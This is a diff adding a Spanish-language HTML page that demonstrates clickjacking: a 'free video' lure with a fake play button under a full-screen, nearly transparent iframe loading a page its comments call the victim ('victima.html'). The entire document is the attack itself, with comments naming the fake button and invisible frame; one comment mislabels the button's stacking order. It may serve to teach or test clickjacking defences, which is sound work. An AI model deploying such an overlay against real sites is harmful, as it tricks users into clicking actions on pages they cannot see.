@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Video Gratis</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+
+    /* iframe ocupa toda la pantalla, pero invisible */
+    iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0.01; /* casi invisible */
+      z-index: 1;
+    }
+
+    /* botón falso */
+    .fake-button {
+      position: relative;
+      margin-top: 200px;
+      z-index: -2; /* arriba del iframe, pero clic pasa al iframe */
+      padding: 30px 60px;
+      font-size: 24px;
+      background: green;
+      color: white;
+      border: none;
+      cursor: pointer;
+      border-radius: 15px
+    }
+  </style>
+</head>
+<body>
+  <h1>🎥 Mira este video gratis</h1>
+  <button class="fake-button">Reproducir video</button>
+
+  <!-- Iframe con la página víctima -->
+  <iframe src="victima.html"></iframe>
+</body>
+</html>
